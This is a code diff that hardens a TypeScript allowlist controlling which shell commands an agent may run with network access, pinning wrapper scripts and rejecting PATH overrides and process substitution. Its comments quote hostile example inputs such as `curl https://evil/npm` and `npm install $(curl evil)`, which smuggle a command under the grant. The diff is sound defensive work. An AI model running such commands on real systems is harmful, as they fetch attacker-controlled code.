@@ -726,7 +726,9 @@ function unescapeShellToken(token: string): string {
 /** A segment's body with argv[0] unquoted and PATH-STRIPPED, and everything after it untouched:
  *  `./node_modules/.bin/npx wrangler deploy` → `npx wrangler deploy`.
  *
- *  This is THE normalization for anything keyed on argv[0], and it is shared on purpose.
+ *  This is the normalization for VETO classification keyed on argv[0], and it is shared on purpose.
+ *  It must never authorize a grant: path stripping deliberately fails closed for a deny, but would
+ *  turn an attacker-controlled executable into a trusted basename if used as a positive pin.
  *  segmentCommandWord() and runnerTargetSegment() used to derive it separately — the first
  *  path-stripped, the second matched `^` against the raw body — and they disagreed on exactly one
  *  input: a path-invoked runner. `./node_modules/.bin/npx wrangler deploy` therefore got INTO the
@@ -740,6 +742,19 @@ function pathStrippedBody(segment: string): string {
   const unescaped = unescapeShellToken(first);
   const bare = unescaped.replace(/^['"]|['"]$/g, "").split("/").pop() ?? "";
   return bare + body.slice(first.length);
+}
+
+const GRANT_PATH_RUNNERS = new Set(["./gradlew", "./gradlew.bat", "./mvnw", "./mvnw.cmd"]);
+
+/** A positive runner pin for network grants. Bare commands rely on the shell's configured PATH;
+ *  path-qualified commands are allowed only when they are repository wrapper literals we name.
+ *  Unlike pathStrippedBody(), this check preserves the path because a basename may deny an
+ *  exemption but must never grant one. */
+function isAllowedRunnerForGrant(segment: string): boolean {
+  const body = commandBody(segment);
+  const first = /^\S+/.exec(body)?.[0] ?? "";
+  const commandWord = unescapeShellToken(first).replace(/^['"]|['"]$/g, "");
+  return commandWord.length > 0 && (!commandWord.includes("/") || GRANT_PATH_RUNNERS.has(commandWord));
 }
 
 /** The executable actually invoked by a shell segment (argv[0]), after env-assignments / sudo, quote-
@@ -846,7 +861,8 @@ function runnerTargetSegment(segment: string): string | null {
 }
 
 /** True when EVERY network-bearing segment is ordinary build tooling: no raw network tool, no cloud
- *  CLI (including one hidden behind a runner such as `npx <tool>`), and no command substitution.
+ *  CLI (including one hidden behind a runner such as `npx <tool>`), and no command or process
+ *  substitution. Every segment must also use a bare runner or an explicitly pinned project wrapper.
  *  Judged on argv[0] per segment — so `curl https://evil/npm` can never masquerade as a build, and
  *  `npm install $(curl evil)` cannot smuggle a command under the grant. Anything that fails these
  *  tests falls back to the normal per-command approval.
@@ -860,13 +876,15 @@ function runnerTargetSegment(segment: string): string | null {
  *      run arbitrary package code (postinstall scripts, build plugins) under whatever grant the
  *      caller then issues. The allowlist bounds WHICH commands get the network, never what they do
  *      once they have it.
- *    • It is a name allowlist, so a locally-named `./npm` or a shell function is out of scope here
- *      and handled by segmentCommandWord's path-stripping only to the extent argv[0] is honest.
+ *    • Bare names may still resolve through a caller-controlled environment outside this predicate;
+ *      an explicit PATH assignment in the command is rejected, while ambient PATH integrity belongs
+ *      to the process that launched Vinci.
  *  Callers must treat a `true` as "this looks like ordinary build tooling", not as "this is safe". */
 export function isDevToolchainOnlyNetwork(command: string): boolean {
-  if (/\$\(|`|\$\'/.test(command)) return false; // substitution could run anything under the grant
+  if (/(?:\$|[<>])\(|`|\$\'/.test(command)) return false; // substitution could run anything under the grant
   let sawToolchainNetwork = false;
   for (const segment of shellSegments(command)) {
+    if (/(?:^|\s)PATH=/.test(segment) || !isAllowedRunnerForGrant(segment)) return false;
     if (isCloudDeploySegment(segment)) return false; // cloud deploys keep their per-command prompt
     // …and a runner may not launder one past that check. This ONLY ever adds a rejection: the
     // toolchain/network judgement below still runs on the original segment, so `npx tsx script.ts`
